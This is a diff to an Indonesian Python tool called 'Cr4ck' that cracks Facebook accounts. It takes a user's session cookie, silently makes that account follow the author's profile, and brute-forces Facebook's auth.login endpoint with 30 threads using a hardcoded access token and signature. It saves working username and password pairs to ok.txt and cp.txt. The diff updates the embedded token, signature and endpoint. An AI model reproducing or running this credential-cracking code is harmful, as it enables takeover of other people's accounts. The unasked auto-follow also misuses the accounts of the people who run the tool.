@@ -1,9 +1,10 @@
-#!/usr/bin/python
-# encoding utf-8
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-# Auhtor : muhmmad Syafii
-# Facebook : https://www.facebook.com/fikritampan305
+#Recode Syafii-XD
+#Created 05-07-2022
+#My facebook (https://www.facebook.com/fikritampan305)
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
@@ -26,10 +27,11 @@ def kontol():
 \x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
-\x1b[1;94m______________________________________________________\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Muhammad Syafii
-\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/syafii-XD
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
-\x1b[1;94m_______________________________________________________""")
+\x1b[1;94m────────────────────────────────────────────────────
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Mhd Syafii
+\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampam305
+\x1b[1;94m────────────────────────────────────────────────────""")
 
 def jembut():
     print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
@@ -39,9 +41,9 @@ def jembut():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Muhammad Syafii
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/SyafiiXD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Mhd Syafii
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampam305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def yayanxd():
@@ -52,7 +54,6 @@ def yayanxd():
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
 def moch_yayan():
     time.sleep(0.1)
-    print("\033[94m [\033[95m++\033[95m] Terima Kasih Sudah menggunakan Tools Dari saya ")
     print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
     print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
     print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
@@ -80,7 +81,7 @@ def moch_yayan():
                    ikeh_ikeh_kimochi()
                    kontol()
                    cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
-                   print('\n\033[97m [\033[92m+\033[97m] \033[92mLoading....')
+                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
@@ -94,20 +95,20 @@ def moch_yayan():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/fikritampan305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/fikritampam305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
                      aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://youtube.com/channel/UCr218CW05wRLJguvi9ijRrA") 
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                   os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
-             b = "100004623370585%34%3Ah3WXdOzDiLve3A%3A2%3A1651252084%3A-1%3A10967"
+             b = "100004623370585%7C62f8ce9f74b12f84c123cc23437a4a32"
              params = {
                      'access_token': b,
                      'format': 'JSON',
@@ -117,10 +118,10 @@ def moch_yayan():
                      'password': password,
                      'sdk': 'ios',
                      'generate_session_cookies': '1',
-                     'sig': '6fTUHxNx78gNsup4ZTRjRrwqJnXgi',
+                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://b-api.facebook.com/method/auth.login'
-             response = requests.get(api,params=params)
+             mobile = 'https://mobile.facebook.com/method/auth.login'
+             response = requests.get(mobile, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                  print()
@@ -317,7 +318,7 @@ def moch_yayan():
                    print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
-                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
+                   print('\n [\x1b[1;91m!\x1b[1;97m] Mainkan mode pesawat 5 detik jika tidak ada hasil\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
@@ -347,10 +348,10 @@ def moch_yayan():
          os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
          yayanxd()
     elif yayan == "3" or yayan =="03":
-         os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
+         os.system('xdg-open https://m.facebook.com/groups/curhatkitabyrezamaulan')
          yayanxd()
     elif yayan == "4" or yayan =="04":
-         os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
+         os.system('xdg-open https://m.facebook.com/groups/1873546942975736')
          yayanxd()
     elif yayan == "5" or yayan =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
@@ -358,8 +359,8 @@ def moch_yayan():
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
          yayanxd()
     elif yayan == "0" or yayan =="00":
-         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My Facebook\n\n")
+         os.system('xdg-open https://facebook.com/fikritampan305/frofile.php')
          exit()                   	
 
 if __name__=="__main__":
